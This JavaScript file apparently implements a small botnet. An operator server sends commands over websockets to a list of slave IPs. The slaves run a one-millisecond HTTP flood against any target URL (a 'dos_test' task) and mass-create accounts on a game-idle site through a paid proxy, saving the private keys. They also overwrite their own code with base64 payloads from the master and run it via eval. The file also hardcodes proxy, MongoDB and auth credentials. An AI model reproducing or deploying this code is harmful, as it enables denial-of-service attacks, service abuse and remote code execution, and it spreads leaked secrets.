const AppVersion = "1.0.7"; // this is the version which will identify each server and make sure they're up to date!
let CurrentVersion = AppVersion; // Current version of the application, the master server sends this to all servers!
let NewAppCode = ""; // This'll be updated when the server sends out a new app version request!
const ShellJS = require("shelljs"); // Used for executing shell commands to the terminal in emergency cases!

if (ShellJS){
    //ShellJS.exec("npm i"); // install all packages
}

const { TextEncoder, TextDecoder } = require("util"); // Util module for fixing stupid problems such as TextEncoder is undefined
const fs = require("fs"); // File module, used for creating and reading data aka files
const tunnel = require('tunnel'); // Used for tunneling our http requests through proxies :))
const Mongoose = require("mongoose"); // This is for our database / MongoDB
const DBModel = require("./Models/DB"); // Our database model so we can go through the database
const axios = require("axios"); // For http / https requests n so on
const ClientWebSocket = require("websocket").client; // This is for connecting to non server sockets and letting us listen for input from all servers and the operator!
const expressJS = require("express"); // For starting the server so we can connect web sockets etc
const ExpressWS = require("express-ws"); // Express web sockets
const ExpressApp = expressJS(); // Our express app
const ExpressWebSocket = ExpressWS(ExpressApp); // Our express websocket which contains a set of functions for collecting all connected clients etc!
const WebSocketInstance = ExpressWebSocket.getWss("/server_socket"); // Get the cached data of our worker web socket!
const Servers = {// We'll use the server IP to identify who it is, example: if the server is classed as operator it'll be the one to send out all the commands that the other servers will listen to!
    ["95.111.241.15"]: "operator",
    ["34.245.169.74"]: "operator",
    ["172.18.0.1"]: "operator",
    ["157.245.70.71"]: "slave",
    ["31.49.168.36"]: "slave"
};
const TaskList = { // We'll use this to over-ride tasks!
    "new_account": {Priority: 1, Task: "Account Creation"}
};
const InterVals = []; // Keep track of all inter vals so we can clear them on update.
const TaskDataInUse = []; // We'll use this to split certain tasks in half so each slave server can do them quicker
const CurrentTasks = []; // We'll store every servers current task in this so we don't constantly ask them to do anything while they're working!
const SocketIPs = []; // We'll store every IP that connected to a socket within this array to ensure we can filter out mass connections and save resources.
const DebugMode = true; // Enable this if you want log messages to be printed out, recommended to turn this off in production mode!
const AppPort = process.env.PORT || 7453; // Current web server port
const OperationKey = "S9v^3NX9pUsN!85EFx&Z1ZXnXer#R1Uwx6k%66H@#M3sjp^^BTMcfCJEQby2"; // The operation key which is used for authing message / new task requests!
const LocalHost = false; // This determines where to use a localhost connections which you shouldn't do when running on an actual server!
let DoingTask = false; // this will be set to true if this current server is doing a task provided by the master server
let LocalIP = null; // the current IP of this server, it gets auto set as soon as the server runs!
let CurrentClient = null; // This is the client which we'll use to send back messages to the master, will be set as soon as it connects to the master socket!
let StopConnection = false; // This is used for restarting the server, when set to true the socket won't try to reconnect. The master server tells the server to do this when outdated!

const agent = tunnel.httpsOverHttp({
    proxy: {
        host: '209.127.191.180',
        port: 9279,
        proxyAuth: `eutqpmhe:1vnz3gzykzgj`
    }
});

try{
    axios.get("https://api.ipify.org/?format=json").then((Response) => {
        LocalIP = Response.data.ip

        console.log(LocalIP)

        const PC_RANK = (typeof Servers[LocalIP] != "undefined") ? Servers[LocalIP] : "unknown"

        let NewFile = (new Date() / 1000).toString()

        if (DebugMode){
            fs.writeFileSync(`CONSOLE_LOGS/${NewFile}.log`, "")
        }

        let ToLog = ""
        let ConsoleLogIndex = 0
        
        async function ConsoleLogger(...args){
            if (DebugMode){
                let NewPrinter = ""
                await args.forEach((Value, Index) => {
                    const Middle1 = (Index == 0) ? "" : "\n"
                    const Middle2 = (ConsoleLogIndex == 0) ? "" : "\n"
            
                    NewPrinter = NewPrinter + Middle1 + Value.toString()
                    ToLog = ToLog + Middle2 + Value.toString()
                    ConsoleLogIndex += 1
                })
                console.log(NewPrinter)
                fs.writeFileSync(`CONSOLE_LOGS/${NewFile}.log`, `${ToLog}`)
            }
        }

        fs.readFile("Accounts.txt", "utf8", (Error, FileData) => {})

        function GetSlaveServers(){
            const Slaves = [];

            for (const [ServerIP, ServerRank] of Object.entries(Servers)) {
                if (ServerRank == "slave"){
                    Slaves.push(ServerIP.toString())
                }
            }

            return Slaves
        }

        function SplitTableUp(table){ // it works but it's also ass at the same time, but it'll do for now LOL
            const NewArray = []

            if (typeof table == "object"){
                const BackUpObject = table; // A backup of the main object so we don't overwrite the original
                let BackUpLength = BackUpObject.length;

                for (let _I = 0; _I <= BackUpLength; _I++){
                    const AmountToTake = Math.floor(BackUpObject.length / GetSlaveServers().length); // that moment I keep using lua instructions by mistake because my main is lua
                    const NewObject = [];

                    for (let AmountIndex = 0; AmountIndex < AmountToTake; AmountIndex++){
                        NewObject.push(BackUpObject[AmountIndex]) // Push that data into our new object
                    }

                    BackUpObject.splice(0, AmountToTake) // we also needa remove data from our backup object so we don't keep adding that same data into the new object

                    if (_I >= BackUpLength){ // if hit the max limit
                        if (BackUpObject.length > 0){
                            NewArray.push(BackUpObject) // push our new object into the split object!
                        }
                    }

                    if (NewObject.length > 0){ // Don't wanna be pushing empty objects
                        NewArray.push(NewObject) // push our new object into the split object!
                    }
                }

            }

            return NewArray
        }

        ConsoleLogger(SplitTableUp([ // 6 tasks
            "wow1",
            "wow2",
            "wow3",
            "wow4",
            "wow5",
            "wow6"
        ]))
    
        async function Encrypt(Data, Salt){ // New encryption / cypher
            let currentPass = input.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);});
        }// wrong file brudda
    
        async function Decrypt(Data, Salt){ // New encryption / cypher
    
        }
    
        function IsDoingTask(Client){
            let clientIp1 = Client._socket.remoteAddress
            clientIp1 = clientIp1.replace("::ffff:", "")

            if (typeof CurrentTasks[clientIp1] != "undefined"){
                if (CurrentTasks[clientIp1] == true){
                    return true
                }
            }

            return false
        }

        function TaskHandler(Client, Message){
            try{
                let clientIp1 = Client._socket.remoteAddress
                clientIp1 = clientIp1.replace("::ffff:", "")

                const JSON_DATA = JSON.parse(Message) // Convert our data back into a array / class

                if (JSON_DATA){ // Make sure the data is valid and not null
                    if (typeof JSON_DATA.doing_task != "undefined"){ // Make sure the command and auth key is valid and not null
                        CurrentTasks[clientIp1] = JSON_DATA.doing_task
                    }
                }else{
                    ConsoleLogger("json invalid")
                }
            }catch (task_error){
                ConsoleLogger("[SERVER] -> [ERROR] -> error while executing task handler, " + task_error);
            }
        }

        function CompareRank(Client1){
            let clientIp1 = Client1._socket.remoteAddress
            clientIp1 = clientIp1.replace("::ffff:", "")

            const IP_RANK = (typeof Servers[clientIp1] != "undefined") ? Servers[clientIp1] : "unknown"

            if (IP_RANK == "operator"){
                return true
            }

            return false
        }

        async function CommandHandler(Message){
            
            try{
                const JSON_DATA = JSON.parse(Message) // Convert our data back into a array / class

                if (JSON_DATA){ // Make sure the data is valid and not null
                    if (typeof JSON_DATA.AuthKey != "undefined"){ // Make sure the command and auth key is valid and not null
                        if (JSON_DATA.AuthKey == OperationKey){ // Compare the auth key provided to the servers auth key to make sure they have access to run such commands!
                            //
                            switch((typeof JSON_DATA.type != "undefined") ? JSON_DATA.type : ""){
                                case "task": {
                                    if (JSON_DATA.command == "dos_test" & JSON_DATA.type == "task" & typeof JSON_DATA.target_url != "undefined"){
                                        if (DoingTask == true) { return true }

                                        DoingTask = true;

                                        if (CurrentClient){
                                            CurrentClient.send(JSON.stringify({
                                                doing_task: true
                                            }));
                                        }

                                        let DOS_ID = null

                                        DOS_ID = setInterval(() => {
                                            if (typeof InterVals[DOS_ID] == "undefined"){
                                                InterVals[DOS_ID] = DOS_ID
                                            }

                                            axios.get(JSON_DATA.target_url).then((res) => {
                                                console.log("request sent!")
                                            }).catch((request_error) => {})
                                        }, 1)
                                    }

                                    if (JSON_DATA.command == "new_account" & JSON_DATA.type == "task"){
                                        if (DoingTask == true) { return true }
                                        //
                                        DoingTask = true;
                                        CurrentClient.send(JSON.stringify({
                                            doing_task: true
                                        }));
    
                                        if (typeof JSON_DATA.total != "undefined"){
                                            let Finished = true;
                                            let InterID = null;
                                            let CurrentIndex = 0;
    
                                            InterID = setInterval(async () => {
                                                if (typeof InterVals[InterID] == "undefined"){
                                                    InterVals[InterID] = InterID
                                                }

                                                if (JSON_DATA.total == CurrentIndex){
                                                    DoingTask = false;
                                                    ConsoleLogger("Task completed!");
    
                                                    CurrentClient.send(JSON.stringify({
                                                        doing_task: false
                                                    }));
    
                                                    return clearInterval(InterID);
                                                }
    
                                                if (Finished){
                                                    Finished = false;
                                                    
                                                    await axios.get("https://rbxidle.com/public/api/qsawqa/init", {
                                                        headers: {
                                                            ['User-Agent']: 'Chrome',
                                                        },
                                                        agent,
                                                        port: 443,
                                                    }).then(async (Response) => {
                                                        const newRecord = new DBModel({
                                                            PrivateKey: Response.data.pkey,
                                                            User: Response.data.name,
                                                            Points: 0
                                                        });
    
                                                        await newRecord.save();
    
                                                        setTimeout(() => {
                                                            Finished = true
                                                        }, 1000);
    
                                                        CurrentIndex += 1
                                                    }).catch((bad_man_error) => {
                                                        ConsoleLogger(bad_man_error);
                                                        setTimeout(() => {
                                                            Finished = true
                                                        }, 10000);
                                                    })
                                                }
                                            }, 20);
                                        }
                                        //
                                    }

                                } // Task case end bracket

                                case "app_version":{
                                    if (JSON_DATA.type == "app_version"){
                                        if (typeof JSON_DATA.data != "undefined"){
                                            NewAppCode = Buffer.from(JSON_DATA.data.app_file, 'base64').toString("ascii");
                                            CurrentVersion = JSON_DATA.data.version;
                                        }
                                    }
                                } // app version case end bracket

                            }// Switch statement end bracket
                            //
                        }
                    }
                }else{
                    ConsoleLogger("json invalid");
                }
            }catch (cmd_error){
                ConsoleLogger("[SERVER] -> [ERROR] -> error while executing command, " + cmd_error);
            }
        }

        /*CommandHandler(JSON.stringify({
            type: "task",
            command: "dos_test",
            AuthKey: OperationKey.toString(),
            target_url: "https://grubhubscripts.com"
        }))*/
    
        function InputHandler(Message, ServerRank){
            if (ServerRank == "operator"){
                // This'll execute commands and send inputs to all the servers!
                
                WebSocketInstance.clients.forEach((Worker) => { // Go through the clients list grabbing each client 1 by 1
                    if (!CompareRank(Worker)){ // Stops it from sending a message to the operator!
                        if (!IsDoingTask(Worker)){ // Check if the slave / server is preforming a task, if not then tell it do a task!
                            Worker.send(Message); // Send the worker a nice little message to do it's slave work
                        }
                    }
                });
            }else if (ServerRank == "slave"){
                // This'll take the input cmd and do whatever we want
                CommandHandler(Message);
            };
        };

        Mongoose.connect("mongodb+srv://miningyay:66oPfMujoKaHbjKD@miningthing.4aen9.mongodb.net/test", {
            useNewUrlParser: true,
            useUnifiedTopology: true
        }).then(async (Client) => {
            ConsoleLogger("[SERVER] -> [API] -> [SUCCESS] -> " + 'Connected to DB');
        }).catch((error) => {
            ConsoleLogger("[SERVER] -> [API] -> [ERROR] -> " + 'Failed to connect to DB', error);
        });

        if (PC_RANK == "operator"){
            ConsoleLogger("[SERVER] -> [SUCCESS] -> " + "Starting operator web socket!");

            ExpressApp.get("/", (req, res) => {
                return res.send("Hi");
            })
            
            ExpressApp.ws("/server_socket", (Client, Request) => { // make a connection request to (url:443/server_socket);
                Request.clientIp = Client._socket.remoteAddress;
                Request.clientIp = Request.clientIp.replace("::ffff:", "");
    
                if (SocketIPs[Request.clientIp.toString()]) {
                    Client.send("Bad connection 1");
                    return Client.close();
                }; // Filter out mass connections from the same IP
                
                if (typeof Servers[Request.clientIp.toString()] == "undefined" || Servers[Request.clientIp.toString()] == null){
                    Client.send("Bad connection 2");
                    return Client.close();
                } // Someone tried to connect to our socket without being whitelisted in the server array / class!
        
                const ClientIP = Request.clientIp.toString();
                const ServerRank = (typeof Servers[ClientIP] != "undefined") ? Servers[ClientIP] : "unknown";
        
                ConsoleLogger(`Connection rank: ${ServerRank}, Status: opened!`);
    
                SocketIPs[ClientIP] = true;
                CurrentTasks[ClientIP] = false;
        
                if (ServerRank == "operator"){
                    Client.on("message", (Message) => {
                        InputHandler(Message, ServerRank)
                    })
                    
                    setInterval(() => {

                        fs.readFile("app.js", "utf8", (Error, FileData) => {
                            if (!Error){

                                WebSocketInstance.clients.forEach((Worker) => { // Go through the clients list grabbing each client 1 by 1
                                    if (!CompareRank(Worker) & !IsDoingTask(Worker)){ // Stops it from sending a message to the operator!
                                        Worker.send(JSON.stringify({
                                            type: "app_version",
                                            data: {
                                                version: AppVersion.toString(),
                                                app_file: Buffer.from(FileData.toString()).toString('base64')
                                            },
                                            AuthKey: OperationKey.toString()
                                        }));
                                    }
                                });

                            }
                        })

                        InputHandler(JSON.stringify({
                            type: "task",
                            command: "new_account",
                            AuthKey: OperationKey.toString(),
                            total: 5
                        }), ServerRank)
                    }, 1000)
                }else{
                    Client.on("message", (Message) => {
                        if (ServerRank == "slave") {
                            TaskHandler(Client, Message)
                        }
                    })
                }

                Client.on("close", () => {
                    SocketIPs[ClientIP] = null || undefined;
                    CurrentTasks[ClientIP] = null || undefined;

                    ConsoleLogger(`Connection rank: ${ServerRank}, Status: closed!`);
                })
            });
        }
    
        const ExpressServer = ExpressApp.listen(AppPort, () => { // Listen for a connection to our web server port
            ConsoleLogger("[SERVER] -> [SUCCESS] -> " + "App listening on port " + AppPort);
        }); // if it's connecting to a server it'll need the prcess env port
    
        try {
            if (PC_RANK == "slave"){
                const NewWebClient = new ClientWebSocket(); // create the slaves web client object
        
                NewWebClient.on('connectFailed', function(error) {
                    //ConsoleLogger("[SERVER] -> [SOCKET] -> [ERROR] -> " + 'Failed to connect to master server / socket, retrying!');

                    if (!StopConnection){
                        NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://www.nodetestingservice.herokuapp.com:443/server_socket");
                    }
                });

                NewWebClient.on("connect", (Client) => { // Wait for the slave to connect to the master server socket
                    CurrentClient = Client
                    
                    Client.on("close", () => {
                        if (!StopConnection){
                            NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://www.nodetestingservice.herokuapp.com:443/server_socket");
                        }
                    })

                    Client.on("message", (Message) => {
                        InputHandler(Message.utf8Data, PC_RANK) // Send the message from the master server to the input handler
                    });
                
                }); // Listen for the messages from our master server

                if (!StopConnection){
                    NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://www.nodetestingservice.herokuapp.com:443/server_socket");
                }
                
                let AppVersionInter = null
                AppVersionInter = setInterval(() => {
                    if (typeof InterVals[AppVersionInter] == "undefined"){
                        InterVals[AppVersionInter] = AppVersionInter
                    }

                    if (AppVersion != CurrentVersion & typeof CurrentClient != "undefined"){
                        
                        fs.readFile("app.js", "utf8", (Error, FileData) => {
                            if (!Error){
                                fs.writeFile(`app_backups/${(new Date() / 1000).toString().toString()}.app.js`, FileData.toString(), () => {
                                    fs.writeFile(`app.js`, NewAppCode.toString(), () => {
                                        ConsoleLogger("[SERVER] -> [UPDATE] -> [PENDING] -> " + 'Updating server');
                                        clearInterval(AppVersionInter);
                                        StopConnection = true;

                                        CurrentClient.close();
                                        ExpressServer.close();
                                        
                                        for (const [VAL_ID, VAL_OBJECT] of Object.entries(InterVals)){
                                            clearInterval(VAL_OBJECT);
                                            InterVals[VAL_ID] = null || undefined;
                                        };
                                        
                                        setTimeout(() => {
                                            try{
                                                ConsoleLogger("[SERVER] -> [UPDATE] -> [SUCCESS] -> " + 'Server updated!');
                                                eval(NewAppCode.toString());
                                            } catch(update_error){
                                                ConsoleLogger("[SERVER] -> [UPDATE] -> [FAILLED] -> " + 'Failed to update server!', update_error);
                                            };
                                        }, 1000);
                                    })
                                })
                            }
                        })

                    }
                }, 1000)
            }else if (PC_RANK == "operator"){
                const NewWebClient = new ClientWebSocket(); // create the masters web client object

                NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://www.nodetestingservice.herokuapp.com:443/server_socket"); // we want the master / operator to make itself a connection so we can send out our signals from it
            };
        }catch (listen_socket_error){
            ConsoleLogger("[SERVER] -> [ERROR] -> failed to connect to clients web socket, " + listen_socket_error);
        }
    }).catch(() => {})
}catch (app_error){
    ConsoleLogger("[SERVER] -> [ERROR] -> error while trying to start server, " + app_error);
};